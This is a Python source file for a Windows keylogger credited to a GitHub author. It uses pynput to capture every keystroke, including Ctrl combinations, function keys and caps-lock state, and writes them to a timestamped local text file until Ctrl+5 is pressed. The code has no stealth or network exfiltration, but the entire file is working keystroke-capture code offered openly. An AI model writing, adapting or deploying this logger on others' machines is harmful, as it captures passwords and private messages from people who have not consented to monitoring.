import datetime
from pynput.keyboard import Listener
from win32api import GetKeyState
from win32con import VK_CAPITAL
import sys

#fecha actual para el nombre del archivo | actual datetime for the filename
date_for_filename = datetime.datetime.now().strftime('%Y-%m-%d %H-%M-%S')

#crea el archivo de texto con el nombre | creates the text file
p = open(f'KG{date_for_filename}.txt', 'w')

p.write('Keylogger by hrdax\n')
p.write('V1.0\n')
p.write('Github Repository: https://github.com/hrdax/keylogger\n\n')



#funcion para obtener las teclas presionadas | function to get the pressed keys
def entradas(llave):
    #obtiene el estado de la tecla caps lock | gets the status of the caps lock key
    statusCaps = GetKeyState(VK_CAPITAL)
    #convierte la tecla presionada a string | converts the pressed key to string
    llave = str(llave)
    #si se presiona ctrl + 5, guarda, cierra y termina | if ctrl + 5 is pressed, saves, closes and ends
    if llave == "<53>":
        p.write('\n\n*Pressed ctrl + 5 (Quitting.. | Saliendo..)*')
        p.close()
        sys.exit()
    #si se presiona enter, escribe un salto de linea | if enter is pressed, writes a line break
    elif llave == 'Key.enter':
        p.write('\n')
    #si se presiona espacio, escribe un espacio | if space is pressed, writes a space
    elif llave == 'Key.space':
        p.write(' ')
    #si se presiona backspace, indica que se borro un caracter y asi sucesivamente con los demas.. 
    #if backspace is pressed, indicates that a character was deleted and so on with the others ..
    elif llave == 'Key.backspace':
        p.write("\bBackspace\b\b")
    elif llave == 'Key.shift_r':
        pass
    elif llave == 'Key.caps_lock':
        pass
    elif llave == 'Key.ctrl_l' or llave == 'KEY.CTRL_L':
        pass
    elif llave == 'Key.ctrl_r' or llave == 'KEY.CTRL_R':
        pass
    elif llave == 'Key.shift' or llave == 'KEY.SHIFT':
        pass
    elif llave == 'Key.alt_l' or llave == 'KEY.ALT_L':
        pass
    elif llave == 'Key.alt_gr' or llave == 'KEY.ALT_GR':
        pass
    elif llave == 'Key.end' or llave == 'KEY.END':
        p.write(' *END KEY* ')
    elif llave == 'Key.tab' or llave == 'KEY.TAB':
        p.write(' *TAB* ')
    elif llave == 'Key.delete' or llave == 'KEY.DELETE':
        p.write(' *DELETE KEY* ')
    elif llave == 'Key.insert' or llave == 'KEY.INSERT':
        p.write(' *INSERT KEY* ')
    elif llave == 'Key.home' or llave == 'KEY.HOME':
        p.write(' *HOME KEY* ')
    elif llave == 'Key.page_down' or llave == 'KEY.PAGE_DOWN':
        p.write(' *PAGE DOWN KEY* ')
    elif llave == 'Key.page_up' or llave == 'KEY.PAGE_UP':
        p.write(' *PAGE UP KEY* ')
    elif llave == 'Key.print_screen' or llave == 'KEY.PRINT_SCREEN':
        p.write(' *PRINT SCREEN KEY* ')
    elif llave == 'Key.scroll_lock' or llave == 'KEY.SCROLL_LOCK':
        p.write(' *SCROLL LOCK KEY* ')
    elif llave == 'Key.pause' or llave == 'KEY.PAUSE':
        p.write(' *PAUSE KEY* ')
    elif statusCaps == 1:
        p.write(llave.upper().replace("'",""))
    elif llave == 'Key.cmdb':
        pass
    elif llave == 'Key.f1':
        p.write(' *F1 KEY* ')
    elif llave == 'Key.f2':
        p.write(' *F2 KEY* ')
    elif llave == 'Key.f3':
        p.write(' *F3 KEY* ')
    elif llave == 'Key.f4':
        p.write(' *F4 KEY* ')
    elif llave == 'Key.f5':
        p.write(' *F5 KEY* ')
    elif llave == 'Key.f6':
        p.write(' *F6 KEY* ')
    elif llave == 'Key.f7':
        p.write(' *F7 KEY* ')
    elif llave == 'Key.f8':
        p.write(' *F8 KEY* ')
    elif llave == 'Key.f9':
        p.write(' *F9 KEY* ')
    elif llave == 'Key.f10':
        p.write(' *F10 KEY* ')
    elif llave == 'Key.f11':
        p.write(' *F11 KEY* ')
    elif llave == 'Key.f12':
        p.write(' *F12 KEY* ')
    elif llave == "'\\x01'":
        p.write(' CTRL + A ')
    elif llave == "'\\x02'":
        p.write(' CTRL + B ')
    elif llave == "'\\x03'":
        p.write(' CTRL + C ')
    elif llave == "'\\x04'":
        p.write(' CTRL + D ')
    elif llave == "'\\x05'":
        p.write(' CTRL + E ')
    elif llave == "'\\x06'":
        p.write(' CTRL + F ')
    elif llave == "'\\x07'":
        p.write(' CTRL + G ')
    elif llave == "'\\x0b'":
        p.write(' CTRL + K ')
    elif llave == "'\\x0c'":
        p.write(' CTRL + L ')
    elif llave == "'\\x0f'":
        p.write(' CTRL + O ')
    elif llave == "'\\x10'":
        p.write(' CTRL + P ')
    elif llave == "'\\x11'":
        p.write(' CTRL + Q ')
    elif llave == "'\\x12'":
        p.write(' CTRL + R ')
    elif llave == "'\\x13'":
        p.write(' CTRL + S ')
    elif llave == "'\\x14'":
        p.write(' CTRL + T ')
    elif llave == "'\\x15'":
        p.write(' CTRL + U ')
    elif llave == "'\\x16'":
        p.write(' CTRL + V ')
    elif llave == "'\\x17'":
        p.write(' CTRL + W ')
    elif llave == "'\\x18'":
        p.write(' CTRL + X ')
    elif llave == "'\\x19'":
        p.write(' CTRL + Y ')
    elif llave == "'\\x1a'":
        p.write(' CTRL + Z ')
    elif llave == "<49>":
        p.write(' CTRL + 1 ')
    elif llave == "<50>":
        p.write(' CTRL + 2 ')
    elif llave == "<51>":
        p.write(' CTRL + 3 ')
    elif llave == "<52>":
        p.write(' CTRL + 4 ')
    elif llave == "<54>":
        p.write(' CTRL + 6 ')
    elif llave == "<55>":
        p.write(' CTRL + 7 ')
    elif llave == "<56>":
        p.write(' CTRL + 8 ')
    elif llave == "<57>":
        p.write(' CTRL + 9 ')
    elif llave == 'Key.left':
        pass
    elif llave == 'Key.down':
        pass
    elif llave == 'Key.right':
        pass
    elif llave == 'Key.up':
        pass
    elif llave == "Key.esc":
        p.write(' ESC ')
    else:
        p.write(llave.replace("'",""))
    

#inicia el listener | starts the listener
with Listener(on_press=entradas) as i:
    i.join()